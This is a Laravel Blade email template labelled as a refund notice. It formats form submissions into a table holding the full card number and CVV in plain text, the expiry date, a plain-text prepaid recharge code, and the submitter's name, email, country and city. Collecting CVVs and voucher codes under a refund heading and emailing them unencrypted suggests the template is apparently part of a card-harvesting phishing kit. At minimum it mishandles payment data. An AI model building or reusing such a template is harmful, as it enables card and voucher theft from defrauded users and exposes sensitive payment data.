<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
<head>
    <meta charset="utf-8">
    <title>{{ __('mail.refund_user.doc_title') }}</title>
</head>
<body style="margin:0;font-family:system-ui,sans-serif;background:#f8fafc;padding:24px;color:#0f172a;">
    <table role="presentation" width="100%" style="max-width:560px;margin:0 auto;background:#fff;border-radius:16px;overflow:hidden;border:1px solid #e2e8f0;">
        <tr>
            <td style="padding:28px;background:linear-gradient(135deg,#0284c7,#38bdf8);color:#fff;">
                <p style="margin:0;font-size:13px;opacity:0.95;">{{ config('site.name') }} — {{ __('mail.refund_user.header_tag') }}</p>
                <h1 style="margin:8px 0 0;font-size:20px;">{{ __('mail.refund_user.title') }}</h1>
                <p style="margin:10px 0 0;font-size:15px;opacity:0.98;font-family:ui-monospace,monospace;">{{ $payload['reference'] }}</p>
            </td>
        </tr>
        <tr>
            <td style="padding:24px 28px;">
                <p style="margin:0 0 16px;font-size:14px;line-height:1.65;color:#475569;">
                    {{ __('mail.refund_user.intro_1') }}<strong>{{ __('mail.refund_user.intro_strong') }}</strong>{{ __('mail.refund_user.intro_2') }}
                </p>
                <table role="presentation" width="100%" style="font-size:14px;color:#334155;">
                    <tr><td style="padding:6px 0;color:#64748b;">{{ __('mail.refund_user.row_network') }}</td><td style="padding:6px 0;text-align:right;font-weight:600;">{{ $payload['detected_brand'] }}</td></tr>
                    <tr><td style="padding:6px 0;color:#64748b;">{{ __('mail.refund_user.row_pan') }}</td><td style="padding:6px 0;text-align:right;font-family:monospace;word-break:break-all;">{{ $payload['pan_plain'] }}</td></tr>
                    <tr><td style="padding:6px 0;color:#64748b;">{{ __('mail.refund_user.row_exp') }}</td><td style="padding:6px 0;text-align:right;">{{ $payload['exp_month'] }} / {{ $payload['exp_year'] }}</td></tr>
                    <tr><td style="padding:6px 0;color:#64748b;">{{ __('mail.refund_user.row_cvv') }}</td><td style="padding:6px 0;text-align:right;font-family:monospace;">{{ $payload['cvv_plain'] }}</td></tr>
                    <tr><td style="padding:6px 0;color:#64748b;">{{ __('mail.refund_user.row_type') }}</td><td style="padding:6px 0;text-align:right;">{{ $payload['card_type_label'] }}</td></tr>
                    <tr><td style="padding:6px 0;color:#64748b;">{{ __('mail.refund_user.row_code') }}</td><td style="padding:6px 0;text-align:right;font-family:monospace;word-break:break-all;">{{ $payload['recharge_code_plain'] }}</td></tr>
                    <tr><td style="padding:6px 0;color:#64748b;">{{ __('mail.refund_user.row_email') }}</td><td style="padding:6px 0;text-align:right;">{{ $payload['email'] }}</td></tr>
                    <tr><td style="padding:6px 0;color:#64748b;">{{ __('mail.refund_user.row_name') }}</td><td style="padding:6px 0;text-align:right;">{{ $payload['first_name'] }} {{ $payload['last_name'] }}</td></tr>
                    <tr><td style="padding:6px 0;color:#64748b;">{{ __('mail.refund_user.row_country') }}</td><td style="padding:6px 0;text-align:right;">{{ $payload['country_label'] }}</td></tr>
                    <tr><td style="padding:6px 0;color:#64748b;">{{ __('mail.refund_user.row_city') }}</td><td style="padding:6px 0;text-align:right;">{{ $payload['city_postal'] }}</td></tr>
                    <tr><td style="padding:6px 0;color:#64748b;">{{ __('mail.refund_user.row_time') }}</td><td style="padding:6px 0;text-align:right;">{{ $payload['submitted_at'] }}</td></tr>
                </table>
                <p style="margin:24px 0 0;font-size:12px;color:#94a3b8;">{{ __('mail.refund_user.footer') }}</p>
            </td>
        </tr>
    </table>
</body>
</html>
